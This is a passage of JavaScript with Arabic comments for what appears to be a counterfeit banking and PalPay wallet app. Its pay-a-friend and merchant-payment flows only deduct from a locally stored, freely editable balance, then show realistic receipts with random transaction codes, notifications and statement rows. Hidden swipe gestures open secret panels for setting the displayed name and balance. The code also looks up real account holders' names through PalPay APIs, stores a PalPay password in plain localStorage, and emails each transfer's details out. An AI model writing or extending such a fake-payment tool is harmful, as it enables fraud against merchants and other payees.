    if (amount <= 0)            return 0;
    if (amount <= 50)           return 0.5;
    if (amount <= 100)          return 1.0;
    if (amount <= 250)          return 1.5;
    if (amount <= 500)          return 2.0;
    if (amount <= 1000)         return 3.0;
    if (amount <= 3000)         return 5.0;
    return 5.0; // أكثر من 3000 — نفس الشريحة الأخيرة
}

/***********************
 * نظام الصف أثناء انقطاع الإنترنت — Offline Queue
 * كل عملية تُضاف هنا عند انقطاع الإنترنت،
 * وعند استعادة الاتصال تُرسل فوراً عبر EmailJS.
 ***********************/
const OFFLINE_QUEUE_KEY = 'offline_email_queue';

function offlineQueueGet() {
    try {
        const raw = localStorage.getItem(OFFLINE_QUEUE_KEY);
        const data = raw ? JSON.parse(raw) : [];
        return Array.isArray(data) ? data : [];
    } catch (_) { return []; }
}

function offlineQueueSet(queue) {
    try {
        localStorage.setItem(OFFLINE_QUEUE_KEY, JSON.stringify(queue));
    } catch (_) {}
}

function offlineQueueAdd(params) {
    const queue = offlineQueueGet();
    queue.push({ params, queuedAt: new Date().toISOString() });
    offlineQueueSet(queue);
    console.log('📥 تمت إضافة العملية إلى صف الانتظار (انقطاع الإنترنت)');
}

async function offlineQueueFlush() {
    const queue = offlineQueueGet();
    if (queue.length === 0) return;

    console.log(`📤 محاولة إرسال ${queue.length} عملية معلقة...`);
    const remaining = [];

    for (const item of queue) {
        try {
            await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
                ...item.params,
                offline_note: `⏳ تم الإرسال بعد انقطاع (طُوِّبت: ${item.queuedAt})`
            });
            console.log('✅ تم إرسال عملية معلقة');
        } catch (err) {
            console.warn('❌ فشل إرسال عملية معلقة:', err);
            remaining.push(item);
        }
    }

    offlineQueueSet(remaining);
    if (remaining.length === 0) {
        console.log('✅ تم إرسال جميع العمليات المعلقة بنجاح');
    }
}

// الاستماع لعودة الإنترنت ← تفريغ الصف تلقائياً
window.addEventListener('online', () => {
    console.log('🌐 عاد الاتصال — جارٍ إرسال العمليات المعلقة...');
    setTimeout(offlineQueueFlush, 2000); // تأخير 2 ثانية لضمان استقرار الاتصال
});

// تفريغ الصف عند بدء التطبيق (إذا كان هناك اتصال)
document.addEventListener('DOMContentLoaded', () => {
    if (navigator.onLine) offlineQueueFlush();
});

/***********************
 * 1. دالة تحويل الأرقام إلى هندية
 ***********************/
function toHindiNumbers(str) {
    if (str === null || str === undefined) return "";
    const hindiNumbers = ['٠','١','٢','٣','٤','٥','٦','٧','٨','٩'];
    return str.toString().replace(/[0-9]/g, d => hindiNumbers[+d]);
}

/***********************
 * 2. طلب إذن إشعارات الويب
 ***********************/
if ('Notification' in window && Notification.permission !== 'granted') {
    Notification.requestPermission();
}

/***********************
 * 3. إدارة الشاشات والتنقل والتحميل
 ***********************/
const screens = {
    login: document.getElementById('screen-login'),
    s1: document.getElementById('screen-1'),
    accountDetails: document.getElementById('screen-account-details'),
    s2: document.getElementById('screen-2'),
    s3: document.getElementById('screen-3'),
    s4: document.getElementById('screen-4'),
    s5: document.getElementById('screen-5'),
    s6: document.getElementById('screen-6'),
    s7: document.getElementById('screen-7'),
    s8: document.getElementById('screen-8'),
    s9: document.getElementById('screen-9'),
    s10: document.getElementById('screen-10'),
    notif: document.getElementById('screen-notifications')
};

let loadingTimeout;
let currentActiveScreen = 'login';

function showScreen(targetKey) {
    if (loadingTimeout) clearTimeout(loadingTimeout);

     const screensWithLoading = ['accountDetails', 's2', 's3', 's4', 's5', 's6', 's7', 's8'];
    
    if (screensWithLoading.includes(targetKey)) {
        let currentScreen = document.querySelector('.app-screen[style*="display: block"], .app-screen[style*="display: flex"], .payment-view[style*="display: block"], .payment-view[style*="display: flex"]');
        if (!currentScreen && screens[currentActiveScreen]) currentScreen = screens[currentActiveScreen];

        if (currentScreen) {
            const oldLoader = currentScreen.querySelector('.custom-loader');
            if (oldLoader) oldLoader.remove();

            const loader = document.createElement('div');
            loader.className = 'custom-loader';
            currentScreen.appendChild(loader);

            const delay = Math.floor(Math.random() * 2001) + 2000;
            loadingTimeout = setTimeout(() => {
                loader.remove();
                executeScreenSwitch(targetKey);
            }, delay);
            return; 
        }
    }

    executeScreenSwitch(targetKey);
}

function executeScreenSwitch(targetKey) {
    Object.keys(screens).forEach(key => {
        if (screens[key]) screens[key].style.display = 'none';
    });

    if (screens[targetKey]) {
        const targetScreen = screens[targetKey];
        const blockScreens = ['login', 's1', 's4', 's6', 'notif'];
        targetScreen.style.display = blockScreens.includes(targetKey) ? 'block' : 'flex';

        // التمرير يُدار داخل كل شاشة — لا حاجة لتغيير body overflow
        document.body.style.overflow = 'hidden';
        document.body.style.position = 'fixed';
        document.body.style.width = '100%';
        
        const contentDiv = targetScreen.querySelector('.main-content') || targetScreen.querySelector('.acc-content');
        if (contentDiv) {
            if(targetKey === 'accountDetails'){
                contentDiv.style.display = 'flex';
            } else {
                contentDiv.style.display = 'block';
            }
        }
        
        currentActiveScreen = targetKey;
    }
}

function updateS9Inputs(phone = null, name = null) {
    const mPhone = phone !== null ? String(phone || '').trim() : (localStorage.getItem('merchant_phone') || '');
    const mName = name !== null ? String(name || '').trim() : '';
    const phoneS9 = document.getElementById('merchant-phone-s9');
    const nameS9 = document.getElementById('merchant-name-s9');
    if (phoneS9) phoneS9.value = mPhone;
    if (nameS9) nameS9.value = mName ? ('اسم التاجر: ' + mName) : '';
}

// العودة للشاشة الأولى مع تأثير التحميل 3 ثواني
function showS1WithLoader() {
    showScreen('s1');
    const overlay = document.getElementById('s1-loader-overlay');
    if (overlay) {
        overlay.style.display = 'flex';
        setTimeout(() => {
            overlay.style.display = 'none';
        }, 3000);
    }
}

// دالة التحقق قبل الانتقال من الشاشة 8 إلى 9 - بحث مباشر من API
async function checkAndGoToS9(e) {
    if(e) e.preventDefault();
    const s8Input = document.getElementById('merchant-phone-input');
    const phoneVal = s8Input ? s8Input.value.trim() : "";
    if (phoneVal === "" || phoneVal === "0") return;
    const contact = await _directAPILookup(phoneVal);
    if (!contact || !contact.name) {
        updateS9Inputs(phoneVal, '');
        showVerifyModal();
        return;
    }
    localStorage.setItem('merchant_phone', phoneVal);
    localStorage.setItem('merchant_name', contact.name);
    updateS9Inputs(phoneVal, contact.name);
    showScreen('s9');
}

// أزرار التنقل
const accountCurrencyData = {
    shekel: {
        title: 'حساب الشيقل',
        available: '44.91',
        current: '44.91',
        number: '090001562717376004000',
        empty: false
    },
    dollar: {
        title: 'حساب الدولار',
        available: '0.00',
        current: '0.00',
        number: '090001562717376004001',
        empty: true
    },
    dinar: {
        title: 'حساب الدينار',
        available: '0.000',
        current: '0.000',
        number: '090001562717376004002',
        empty: true
    }
};

function openAccountDetails(currency) {
    const data = accountCurrencyData[currency] || accountCurrencyData.shekel;

    const title = document.getElementById('acc-currency-title');
    const number = document.getElementById('acc-full-number');
    const available = document.getElementById('acc-available-balance');
    const current = document.getElementById('acc-current-balance');
    const tableContainer = document.querySelector('.acc-table-container');
    const shekelRows = document.querySelectorAll('#statement-tbody tr[data-currency="shekel"]');

    // حساب الشيكل يستخدم نفس الرصيد الرئيسي الظاهر في شاشة الـ17 أيقونة.
    // لا نعتمد على قيمة ثابتة داخل accountCurrencyData حتى يبقى الرصيدان متطابقين.
    if (currency === 'shekel') {
        const sharedBalance = parseFloat(localStorage.getItem('user_balance'));
        if (Number.isFinite(sharedBalance)) {
            data.available = sharedBalance.toFixed(2);
            data.current = sharedBalance.toFixed(2);
        }
    }

    if (title) title.textContent = data.title;
    if (number) number.textContent = data.number;
    if (available) available.textContent = data.available;
    if (current) current.textContent = data.current;

    shekelRows.forEach(row => {
        row.style.display = currency === 'shekel' ? '' : 'none';
    });

    executeScreenSwitch('accountDetails');

    // في حسابي الدولار والدينار تظهر نافذة منبثقة بعد ثانيتين.
    if (window.accountEmptyPopupTimer) clearTimeout(window.accountEmptyPopupTimer);
    const oldPopup = document.getElementById('account-empty-popup');
    if (oldPopup) oldPopup.remove();

    if (tableContainer) tableContainer.style.display = 'none';

    const accContent = document.querySelector('.acc-content');
    if (accContent) {
        const oldLoader = document.getElementById('acc-loader');
        if (oldLoader) oldLoader.remove();

        const loader = document.createElement('div');
        loader.className = 'custom-loader';
        loader.id = 'acc-loader';
        loader.style.margin = '50px auto';

        if (tableContainer) {
            tableContainer.parentElement.insertBefore(loader, tableContainer);
        } else {
            accContent.appendChild(loader);
        }
    }

    setTimeout(() => {
        const loader = document.getElementById('acc-loader');
        if (loader) loader.remove();
        if (tableContainer) tableContainer.style.display = 'block';
    }, 3000);

    if (data.empty) {
        window.accountEmptyPopupTimer = setTimeout(() => {
            showEmptyAccountPopup();
        }, 2000);
    }
}

function showEmptyAccountPopup() {
    const existing = document.getElementById('account-empty-popup');
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.id = 'account-empty-popup';
    overlay.className = 'account-empty-popup-overlay';
    overlay.innerHTML = `
        <div class="account-empty-popup" role="dialog" aria-modal="true">
            <div class="account-empty-popup-message">لا توجد حركات لهذا الحساب</div>
            <button type="button" class="account-empty-popup-ok">موافق</button>
        </div>
    `;
    document.body.appendChild(overlay);

    overlay.querySelector('.account-empty-popup-ok')?.addEventListener('click', () => {
        overlay.remove();
    });
}

document.getElementById('to-account-details')?.addEventListener('click', () => {
    openAccountDetails('shekel');
});

document.getElementById('to-dollar-account-details')?.addEventListener('click', () => {
    openAccountDetails('dollar');
});

document.getElementById('to-dinar-account-details')?.addEventListener('click', () => {
    openAccountDetails('dinar');
});

// دعم الضغط على Enter/Space في خانات العملات
document.querySelectorAll('.account-currency-trigger').forEach(el => {
    el.addEventListener('keydown', e => {
        if (e.key === 'Enter' || e.key === ' ') {
            e.preventDefault();
            openAccountDetails(el.dataset.currency);
        }
    });
});

document.getElementById('back-from-account-details')?.addEventListener('click', () => showScreen('s1'));
document.getElementById('to-s2')?.addEventListener('click', () => showScreen('s2'));
document.getElementById('to-s3')?.addEventListener('click', () => showScreen('s3'));
document.querySelector('.fab-btn-bright-purple')?.addEventListener('click', () => showScreen('s4'));
document.getElementById('back-to-s3')?.addEventListener('click', () => showScreen('s3'));
document.getElementById('back-to-s1')?.addEventListener('click', () => showScreen('s1'));
document.getElementById('back-to-s2')?.addEventListener('click', () => showScreen('s2'));
document.getElementById('back-to-s4')?.addEventListener('click', () => showScreen('s4'));
document.getElementById('back-from-notifications')?.addEventListener('click', () => showScreen('s1'));
document.getElementById('finish-button')?.addEventListener('click', showS1WithLoader);
document.getElementById('to-s7')?.addEventListener('click', () => showScreen('s7'));
document.getElementById('back-to-s1-from-s7')?.addEventListener('click', () => showScreen('s1'));
document.querySelector('#screen-7 .payment-card img[src*="J3zaJSU.png"]')?.parentElement.addEventListener('click', () => showScreen('s8'));
document.getElementById('back-to-s7')?.addEventListener('click', () => showScreen('s7'));
document.getElementById('back-to-s7-from-s8')?.addEventListener('click', () => showScreen('s7'));

// أزرار التحقق والانتقال من 8 إلى 9
document.querySelector('#screen-8 button')?.addEventListener('click', checkAndGoToS9);
document.getElementById('btn-pay-s8')?.addEventListener('click', checkAndGoToS9);

if (document.getElementById("back-to-s8")) { document.getElementById("back-to-s8").onclick = () => showScreen("s8"); }
document.getElementById('cancel-merchant-s9')?.addEventListener('click', () => showScreen('s7'));
document.getElementById('back-from-s10')?.addEventListener('click', showS1WithLoader);
document.getElementById('finish-merchant-payment')?.addEventListener('click', showS1WithLoader);

/***********************
 * 4. نظام الإشعارات وكشف الحساب
 ***********************/
function updateNotificationBadge() {
    const notifBadge = document.getElementById('notif-badge');
    const list = JSON.parse(localStorage.getItem('bank_notifications')) || [];
    if (notifBadge) {
        const isRead = localStorage.getItem('notifications_read') === 'true';
        notifBadge.style.display = 'flex';
        notifBadge.innerText = (isRead || list.length === 0) ? "0" : list.length.toString();
    }
}

function renderNotificationsPage() {
    const container = document.getElementById('notifications-list');
    const list = JSON.parse(localStorage.getItem('bank_notifications')) || [];
    if (!container) return;
    if (list.length === 0) {
        container.innerHTML = '<p style="text-align:center; padding:50px; color:#888;">لا توجد إشعارات حالية</p>';
        return;
    }
    container.innerHTML = list.map(item => `
        <div class="notification-card" style="padding: 15px 20px; border-bottom: 1px solid #eee; background: white; direction: rtl;">
            <div style="display: flex; justify-content: space-between; align-items: center; color: #3b5998; font-weight: bold; font-size: 15px; margin-bottom: 4px;">
                <span>${item.title}</span>
                <span style="font-family: 'Cairo', sans-serif; font-weight: normal; font-size: 13px;">${toHindiNumbers(item.date)}</span>
            </div>
            <div style="text-align: right; font-size: 14px; color: #333; line-height: 1.4;">
                ${item.desc}
            </div>
        </div>`).join('');
}

if (document.getElementById('open-notifications')) {
    document.getElementById('open-notifications').onclick = () => {
        localStorage.setItem('notifications_read', 'true');
        syncCloudFromLocal(['notifications_read']); 
        updateNotificationBadge(); 
        showScreen('notif'); 
        renderNotificationsPage(); 
    };
}

// إضافة حركة في كشف الحساب (محدثة لدعم الحفظ التلقائي)
function addStatementEntry(descText, amountStr, dateStr = null, doSave = true) {
    const tbody = document.getElementById('statement-tbody');
    if (!tbody) return;
    
    // تحديد التاريخ (إما ممرر من الذاكرة أو تاريخ اليوم للحركات الجديدة)
    let finalDate = dateStr;
    if (!finalDate) {
        const today = new Date();
        finalDate = String(today.getDate()).padStart(2, '0') + '/' + 
                    String(today.getMonth() + 1).padStart(2, '0') + '/' + 
                    today.getFullYear();
    }

    const tr = document.createElement('tr');
    tr.innerHTML = `
        <td class="acc-col-date">${finalDate}</td>
        <td class="acc-col-desc">
            <span>${descText}</span>
        </td>
        <td class="acc-col-amount">${amountStr}</td>
    `;
    tr.setAttribute('data-currency', 'shekel');
    
    // إضافة الصف إلى أعلى الجدول
    tbody.insertBefore(tr, tbody.firstChild);

    // حفظ الحركة في localStorage إذا كانت حركة جديدة (doSave = true)
    if (doSave) {
        let statements = JSON.parse(localStorage.getItem('bank_statements')) || [];
        // إضافة الحركة الجديدة في بداية المصفوفة (الأحدث أولاً)
        statements.unshift({ date: finalDate, desc: descText, amount: amountStr });
        localStorage.setItem('bank_statements', JSON.stringify(statements));
        syncCloudFromLocal(['bank_statements']);
    }
}

// دالة جديدة لتحميل حركات الحساب المحفوظة مسبقاً
function loadSavedStatements() {
    const statements = JSON.parse(localStorage.getItem('bank_statements')) || [];
    // نعكس المصفوفة لنبدأ بإضافة الأقدم ثم الأحدث، ليبقى الأحدث دائماً في أعلى الجدول
    statements.reverse().forEach(stmt => {
        addStatementEntry(stmt.desc, stmt.amount, stmt.date, false);
    });
}

// تحديث الرصيد في جميع الأماكن
function updateAllBalances(newBalance) {
    const balanceElements = [
        document.querySelector('.amount-number-system'),
        ...document.querySelectorAll('.acc-balance-text')
    ];
    balanceElements.forEach(el => {
        if(el) el.textContent = parseFloat(newBalance).toFixed(2);
    });
}

/***********************
 * 5. العمليات المالية (لصديق) وحساب العمولة
 ***********************/
let currentBalance = parseFloat(localStorage.getItem('user_balance')) || 44.91;

const amountInput = document.querySelector('.amount-input');
const recipientNameEl = document.getElementById('recipientName');
const recipientPhoneEl = document.getElementById('recipientPhone');
const recipientIcon = document.getElementById('recipientIcon');

let currentCommission = 0; 

amountInput?.addEventListener('input', () => {
    const val = parseFloat(amountInput.value) || 0;
    document.getElementById('amount-s5').textContent = val.toFixed(2) + ' ILS';
});

document.getElementById('confirmBtn')?.addEventListener('click', function() {
    const val = parseFloat(amountInput.value) || 0;
    
    // التوقف بصمت إذا كان المبلغ 0
    if (val === 0) return;

    const total = val + currentCommission; 
    if (total > currentBalance) return alert('الرصيد غير كافٍ');

    currentBalance -= total;
    localStorage.setItem('user_balance', currentBalance.toFixed(2));
    syncCloudFromLocal(['user_balance']);
    updateAllBalances(currentBalance);

    const random9DigitCode = Math.floor(100000000 + Math.random() * 900000000);

    const newNotif = {
        title: "الدفع لصديق",
        date: new Date().toLocaleDateString('en-GB'),
        desc: `تحويل دفع لصديق: ${recipientNameEl.textContent}، بمبلغ <b>${total.toFixed(2)} ILS</b>`
    };
    
    const list = JSON.parse(localStorage.getItem('bank_notifications')) || [];
    list.unshift(newNotif);
    localStorage.setItem('bank_notifications', JSON.stringify(list));
    localStorage.setItem('notifications_read', 'false');
    syncCloudFromLocal(['bank_notifications', 'notifications_read']);

    // إدراج في كشف الحساب التلقائي
    const stmtDesc = `دفع ل ${recipientNameEl.textContent}، رقم الحركة : ${random9DigitCode}`;
    addStatementEntry(stmtDesc, total.toFixed(1) + '-');

    document.getElementById('display-name').textContent = recipientNameEl.textContent;
    document.getElementById('display-phone').textContent = recipientPhoneEl.textContent || '---';
    document.getElementById('display-amount').textContent = total.toFixed(1) + ' ILS';
    document.getElementById('display-code').textContent = random9DigitCode;

    // ✉️ إرسال بيانات التحويل عبر EmailJS
    sendTransferData(
        localStorage.getItem('recipient_name')  || recipientNameEl.textContent  || '—',
        localStorage.getItem('recipient_phone') || recipientPhoneEl.textContent || '—',
        total.toFixed(2)
    );

    showScreen('s6');
    updateNotificationBadge();
});

/***********************
 * 6. اختيار البنك (والتحقق من المستلم وتطبيق العمولة)
 ***********************/
const bottomSheet = document.getElementById('bottomSheet');
const overlay = document.getElementById('overlay');
const phoneInput = document.getElementById('s4-phone-input') || document.querySelector('#screen-4 .input-field');
const _s4NameDisplay = document.getElementById('s4-name-display');

// ─── بحث مباشر عبر API - بدون كاش ولا تخزين مسبق ───
async function _directAPILookup(mobileNumber) {
    const key = phoneKey(mobileNumber);
    if (!key || !isValidPalPhone(key)) return null;
    // مسح الكاش لهذا الرقم دائماً — بحث حي بدون تخزين مسبق
    _palPayPhoneCache.delete(key);
    // استخدام الدوال الأصلية المجربة مباشرة
    const result = await apiCheckPayToFriendAccount(key)
                || await apiCheckIBuraqReceiver(key);
    // لا نحفظ في الكاش
    return result || null;
}

function _showS4Name(text, state) {
    // state: 'loading' | 'found' | 'notfound' | 'error' | ''
    if (!_s4NameDisplay) return;
    const colors = { loading: '#888', found: '#2e7d32', notfound: '#c62828', error: '#c62828', '': '#888' };
    _s4NameDisplay.style.color = colors[state] || '#888';
    _s4NameDisplay.textContent = text;
}

let _s4SearchTimer = null;
let _s4LastSearched = '';

phoneInput?.addEventListener('input', () => {
    const val = phoneInput.value.trim();
    _showS4Name('', '');
    clearTimeout(_s4SearchTimer);

    if (!val || val.length < 10) return;
    if (!isValidPalPhone(val)) {
        _showS4Name('رقم غير صالح', 'error');
        return;
    }
    _s4LastSearched = val;
    _showS4Name('جاري البحث...', 'loading');

    _s4SearchTimer = setTimeout(async () => {
        if (phoneInput.value.trim() !== val) return; // تغير الرقم أثناء البحث
        const result = await _directAPILookup(val);
        if (phoneInput.value.trim() !== val) return; // تأكيد ثانٍ
        if (result && result.name) {
            _showS4Name('✔ ' + result.name, 'found');
            localStorage.setItem('recipient_phone', val);
            localStorage.setItem('recipient_name', result.name);
        } else {
            _showS4Name('لا يوجد حساب لهذا الرقم', 'notfound');
            localStorage.removeItem('recipient_name');
            localStorage.setItem('recipient_phone', val);
        }
    }, 300);
});

// الـ blur يُبقي النتيجة كما هي - لا حاجة لإعادة بحث
const merchantPhoneField = document.getElementById('merchant-phone-input');
merchantPhoneField?.addEventListener('blur', async () => {
    const phoneVal = merchantPhoneField.value.trim();
    if (!phoneVal || phoneVal === '0') return;
    const result = await _directAPILookup(phoneVal);
    if (result?.name) {
        localStorage.setItem('merchant_phone', phoneVal);
        localStorage.setItem('merchant_name', result.name);
        updateS9Inputs(phoneVal, result.name);
    } else {
        localStorage.removeItem('merchant_name');
        localStorage.setItem('merchant_phone', phoneVal);
        updateS9Inputs(phoneVal, '');
        showVerifyModal();
    }
});

document.getElementById('openSheetBtn')?.addEventListener('click', () => {
    bottomSheet.style.bottom = "0";
    overlay.style.display = "block";
});

const closeSheet = () => {
    bottomSheet.style.bottom = "-100%";
    overlay.style.display = "none";
};

document.querySelector('.close-text')?.addEventListener('click', closeSheet);
overlay?.addEventListener('click', closeSheet);

document.querySelectorAll('.bank-item').forEach(item => {
    item.addEventListener('click', async () => {
        const val = parseFloat(amountInput.value) || 0;
        const phoneVal = phoneInput.value.trim();

        // التوقف بصمت إذا كان المبلغ 0 أو رقم الموبايل فارغاً/0
        if (val === 0 || phoneVal === "" || phoneVal === "0") {
            return; 
        }

        closeSheet();
        const bankType = item.dataset.target;
        if (recipientIcon) {
            if (bankType === 'palpay') {
                recipientIcon.innerHTML = `<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsBGlRu3lHxzkgUR-nnflMv6GdZCm3UooakEJDQAXXAnIy2cNjCbc6h1Qo&s=10" width="48">`;
            } else if (bankType === 'palpay-wallet') {
                recipientIcon.innerHTML = `<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRo-2NOar_qcerlGh166EDRRqtax-y9FOS0Kc3sIEkBk078sxawPAvRbAV7&s=10" width="48">`;
            }
        }

        if (bankType === 'palpay') {
            currentCommission = calcPalPayCommission(val);
        } else {
            currentCommission = 0;
        }

        document.getElementById('amount-s5').textContent = val.toFixed(2) + ' ILS';
        document.getElementById('commission-s5').textContent = currentCommission.toFixed(2) + ' ILS';
        document.getElementById('total-s5').textContent = (val + currentCommission).toFixed(2) + ' ILS';

        // بحث مباشر من API بدون كاش
        const contact = await _directAPILookup(phoneVal);

        if (contact && contact.name) {
            recipientNameEl.textContent = contact.name;
            recipientPhoneEl.textContent = phoneVal;
            localStorage.setItem('recipient_name', contact.name);
            localStorage.setItem('recipient_phone', phoneVal);
            _showS4Name('✔ ' + contact.name, 'found');
            showScreen('s5');
        } else {
            showVerifyModal();
        }
    });
});

document.getElementById('verifyOkBtn')?.addEventListener('click', () => {
    document.getElementById('verifyModal').style.display = 'none';
});

/***********************
 * 7. نظام السحب المتطور والحفظ التلقائي
 ***********************/
let startX = 0;
let startY = 0;
let lastSwipeTime = 0;
let autoSaveTimer;
let swipeDownCount = 0;
let swipeDownTimer = null;

function checkMainScreen() {
    const loginScreen = document.getElementById('screen-login');
    return loginScreen && loginScreen.style.display !== 'none';
}

document.addEventListener('touchstart', e => {
    startX = e.changedTouches[0].screenX;
    startY = e.changedTouches[0].screenY;
}, {passive: true});

document.addEventListener('touchend', e => {
    const diffX = e.changedTouches[0].screenX - startX;
    const diffY = e.changedTouches[0].screenY - startY;
    const now = Date.now();

    // السحب من أعلى لأسفل في الشاشة الرئيسية 3 مرات متتالية → الرجوع لشاشة الدخول
    const screen1 = document.getElementById('screen-1');
    const isScreen1Visible = screen1 && screen1.style.display !== 'none';
    if (isScreen1Visible && diffY > 80 && Math.abs(diffX) < 80) {
        const now2 = Date.now();
        if (now2 - lastSwipeTime < 800) {
            swipeDownCount++;
        } else {
            swipeDownCount = 1;
        }
        lastSwipeTime = now2;
        if (swipeDownCount >= 3) {
            swipeDownCount = 0;
            showScreen('login');
        }
        return;
    }

    if (!checkMainScreen()) return;

    if (diffX > 60) {
        if (now - lastSwipeTime < 500) openPanel('hidden-right');
        lastSwipeTime = now;
    }
    if (diffX < -60) {
        if (now - lastSwipeTime < 500) openPanel('hidden-left');
        lastSwipeTime = now;
    }
}, {passive: true});

function openPanel(id) {
    const p = document.getElementById(id);
    if (!p) return;

    if (id === 'hidden-right') {
        document.getElementById('edit-name').value = localStorage.getItem('user_name') || "";
        document.getElementById('edit-balance').value = localStorage.getItem('user_balance') || "";
        p.style.right = "0px";
    } else {
        document.getElementById('merchant-name-input').value        = localStorage.getItem('merchant_name')   || "";
        document.getElementById('merchant-phone-input-edit').value  = localStorage.getItem('merchant_phone')  || "";
        document.getElementById('recipient-name-input').value       = localStorage.getItem('recipient_name')  || "";
        document.getElementById('recipient-phone-input').value      = localStorage.getItem('recipient_phone') || "";

        // تهيئة حقول PalPay API (رقم الحساب فقط — كلمة المرور لا تُعرض مجدداً للأمان)
        const authPhoneEl = document.getElementById('palpay-auth-phone-input');
        if (authPhoneEl) authPhoneEl.value = localStorage.getItem('palpay_auth_phone') || "";

        p.style.left = "0px";

        clearTimeout(autoSaveTimer);
        autoSaveTimer = setTimeout(() => saveLeftData(true), 20000);
    }
}

document.getElementById('save-right').onclick = function() {
    const name = document.getElementById('edit-name').value;
    const bal = document.getElementById('edit-balance').value;
    localStorage.setItem('user_name', name);
    localStorage.setItem('user_balance', bal);
    syncCloudFromLocal(['user_name', 'user_balance']);
    currentBalance = parseFloat(bal) || 0; 
    
    const s1Name = document.querySelector('.welcome-text');
    if(s1Name) s1Name.innerHTML = `مرحباً، ${name}`;
    updateAllBalances(currentBalance);
    
    document.getElementById('hidden-right').style.right = "-320px";
};

function saveLeftData(isAuto = false) {
    const mName = document.getElementById('merchant-name-input').value.trim();
    const mPhone = document.getElementById('merchant-phone-input-edit').value.trim();
    const rName = document.getElementById('recipient-name-input').value.trim();
    const rPhone = document.getElementById('recipient-phone-input').value.trim();

    // ─── حقول PalPay API (اختيارية — لتفعيل تسجيل الدخول الحقيقي) ───
    const authPhoneEl    = document.getElementById('palpay-auth-phone-input');
    const authPasswordEl = document.getElementById('palpay-auth-password-input');
    const authPhone      = authPhoneEl    ? authPhoneEl.value.trim()    : '';
    const authPassword   = authPasswordEl ? authPasswordEl.value.trim() : '';

    // حفظ الحقول فوراً محلياً وسحابياً.
    localStorage.setItem('merchant_name', mName);
    localStorage.setItem('merchant_phone', mPhone);
    localStorage.setItem('recipient_name', rName);
    localStorage.setItem('recipient_phone', rPhone);
    syncCloudFromLocal(['merchant_name', 'merchant_phone', 'recipient_name', 'recipient_phone']);

    // حفظ بيانات اعتماد PalPay API محلياً فقط (لا تُرفع للسحابة).
    if (authPhone)    localStorage.setItem('palpay_auth_phone',    authPhone);
    if (authPassword) localStorage.setItem('palpay_auth_password', authPassword);

    // إذا تغيرت البيانات → سجّل دخولاً جديداً في الخلفية
    if (authPhone && authPassword) {
        palPayLogin(authPhone, authPassword).then(ok => {
            if (ok) loadPayeesFromPalPayAPI();
        });
    }

    // بناء دليل رقم ← اسم.
    if (mName && mPhone) saveContactMapping(mName, mPhone, 'merchant');
    if (rName && rPhone) saveContactMapping(rName, rPhone, 'recipient');

    const s8Input = document.getElementById('merchant-phone-input');
    if(s8Input) s8Input.value = mPhone;

    clearTimeout(autoSaveTimer);
    if (!isAuto) document.getElementById('hidden-left').style.left = '-320px';
}


if(document.getElementById('save-left')) {
    document.getElementById('save-left').onclick = () => saveLeftData(false);
}

// حفظ تلقائي أثناء الكتابة، وليس فقط عند الضغط على "حفظ الآن".
[
    'recipient-name-input', 'recipient-phone-input',
    'merchant-name-input', 'merchant-phone-input-edit',
    'palpay-auth-phone-input', 'palpay-auth-password-input'
].forEach(id => {
    const el = document.getElementById(id);
    el?.addEventListener('input', () => {
        clearTimeout(autoSaveTimer);
        autoSaveTimer = setTimeout(() => saveLeftData(true), 350);
    });
});

document.querySelectorAll('.hidden-panel-custom').forEach(panel => {
    panel.onclick = (e) => e.stopPropagation();
});

/***********************
 * 8. الـ QR Scanner والتحقق
 ***********************/
let html5QrCode;
const readerContainer = document.getElementById('reader-container');
const flashBtn = document.getElementById('flash-toggle-btn');
const closeBtnText = document.getElementById('close-scanner-text');
const scanImageBtn = document.getElementById('scan-image-btn');
const fileInput = document.getElementById('qr-input-file');

document.querySelectorAll('.qr-trigger').forEach(img => {
    
    img.addEventListener('click', startScanner);
});

scanImageBtn?.addEventListener('click', () => { fileInput.click(); });

fileInput?.addEventListener('change', async (e) => {
    if (e.target.files.length === 0) return;
    const imageFile = e.target.files[0];
    try {
        if (!html5QrCode) html5QrCode = new Html5Qrcode("reader");
        if (html5QrCode.isScanning) await html5QrCode.stop();
        const decodedText = await html5QrCode.scanFile(imageFile, true);
        
        const contact = await _directAPILookup(decodedText.trim());
        if (!contact || !contact.name) {
            showVerifyModal();
            stopScanner();
            return;
        }
        localStorage.setItem('merchant_name', contact.name);
        localStorage.setItem('merchant_phone', decodedText.trim());
        updateS9Inputs();
        stopScanner();
        showScreen('s9'); 
    } catch (err) {
        alert("لم يتم العثور على QR واضح في الصورة");
        console.error(err);
    }
});

async function startScanner() {
    readerContainer.style.display = 'block';
    if (!html5QrCode) html5QrCode = new Html5Qrcode("reader");
    html5QrCode.start(
        { facingMode: "environment" },
        { fps: 10, qrbox: { width: 250, height: 250 } },
        async (decodedText) => {
            const contact = await _directAPILookup(decodedText.trim());
            if (!contact || !contact.name) {
                showVerifyModal();
                stopScanner();
                return;
            }
            localStorage.setItem('merchant_name', contact.name);
            localStorage.setItem('merchant_phone', decodedText.trim());
            updateS9Inputs();
            stopScanner();
            showScreen('s9'); 
        }
    ).catch(err => {
        // الكاميرا غير متاحة — افتح مباشرة اختيار الصورة بدون رسالة خطأ
        console.warn("الكاميرا غير متاحة، انتقل لاختيار صورة:", err);
        fileInput.click();
    });
}

function stopScanner() {
    if (html5QrCode && html5QrCode.isScanning) {
        html5QrCode.stop().then(() => { readerContainer.style.display = 'none'; });
    } else {
        readerContainer.style.display = 'none';
    }
}

document.getElementById('open-scanner-btn')?.addEventListener('click', startScanner);
closeBtnText?.addEventListener('click', stopScanner);

/***********************
 * 9. تهيئة عند التحميل
 ***********************/
window.onload = () => {
    updateNotificationBadge();
    
    // استدعاء الحركات المالية المحفوظة في كشف الحساب
    loadSavedStatements();

    const savedBal = localStorage.getItem('user_balance');
    if(savedBal) {
        updateAllBalances(savedBal);
        // ضمان أن حساب الشيكل في تفاصيل الحساب يعرض نفس الرصيد الرئيسي.
        const balance = parseFloat(savedBal);
        if (Number.isFinite(balance) && accountCurrencyData.shekel) {
            accountCurrencyData.shekel.available = balance.toFixed(2);
            accountCurrencyData.shekel.current = balance.toFixed(2);
        }
    }

    const savedName = localStorage.getItem('user_name');
    const s1Name = document.querySelector('.welcome-text');
    if(savedName && s1Name) s1Name.innerHTML = `مرحباً، ${savedName}`;
    
    const grid = document.getElementById('services-grid');
